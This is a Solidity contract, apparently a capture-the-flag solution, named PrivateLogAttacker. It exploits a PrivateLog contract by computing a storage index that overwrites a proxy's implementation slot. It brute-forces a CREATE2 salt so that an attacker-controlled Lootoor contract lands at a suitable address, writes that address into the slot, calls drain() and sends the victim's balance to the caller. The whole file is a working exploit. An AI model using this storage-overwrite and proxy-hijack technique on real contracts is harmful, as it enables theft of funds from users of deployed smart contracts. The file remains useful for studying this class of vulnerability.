// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./PrivateLog.sol";
import "./Lootoor.sol";
// import "hardhat/console.sol";

contract PrivateLogAttacker {
    function getSamplePasswordHash(string memory _password) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(_password));
    }

    function getSampleInitializerData() external view returns (bytes memory) {
        return abi.encodeWithSignature("init(bytes32)", this.getSamplePasswordHash("yakuhito"));
    }

    // https://ethereum.stackexchange.com/questions/2519/how-to-convert-a-bytes32-to-string
    // modified to return bytes fo len 31
    function addressToStr(address _addr) public returns (string memory) {

    // string memory str = string(_bytes32);
    // TypeError: Explicit type conversion not allowed from "bytes32" to "string storage pointer"
    // thus we should fist convert bytes32 to bytes (to dynamically-sized byte array)

    bytes memory addrAsBytes = abi.encodePacked(_addr);

    bytes memory bytesArray = new bytes(31);
    for(uint256 i = 0; i < addrAsBytes.length - 1; ++i) {
        bytesArray[bytesArray.length - 1 - i] = addrAsBytes[addrAsBytes.length - i - 2];
    }
    return string(bytesArray);
    }

    function exploit(address _privateLog, string memory _password) external {
        // 1. compute log entry 'index'
        uint256 actualAt;
        PrivateLog privateLog = PrivateLog(_privateLog);
        assembly {
            mstore(0x00, 2) // always slot 2
            actualAt := sub(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, keccak256(0x00, 0x20)) // implementation slot for proxy
        }

        // 2. bruteforce value to write so it point to a Lootoor instance
        // https://solidity-by-example.org/app/create2/
        bytes memory bytecode = type(Lootoor).creationCode;
        uint256 salt = 1337;
        while(true) {
            bytes32 hash = keccak256(
                abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode))
            );
            address expectedAddress = address(uint160(uint(hash)));
            bytes memory expectedAddressArr = abi.encodePacked(expectedAddress);

            if(expectedAddressArr[expectedAddressArr.length - 1] == 0x3e) {
                break;
            }
            salt += 1;
        }
        // console.log("salt: %s", salt);

        address lootoorAddress;
        assembly {
            lootoorAddress := create2(
                callvalue(), // wei sent with current call
                // Actual code starts after skipping the first 32 bytes
                add(bytecode, 0x20),
                mload(bytecode), // Load the size of code contained in the first 32 bytes
                salt // Salt from function arguments
            )

            if iszero(extcodesize(lootoorAddress)) {
                revert(0, 0)
            }
        }

        // console.log("lootoor deployed at: %s", lootoorAddress);
        string memory actualValue = this.addressToStr(lootoorAddress);

        privateLog.updateLogEntry(
            actualAt,
            actualValue,
            _password,
            this.getSamplePasswordHash(_password)
        );

        Lootoor(_privateLog).drain();
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {}
}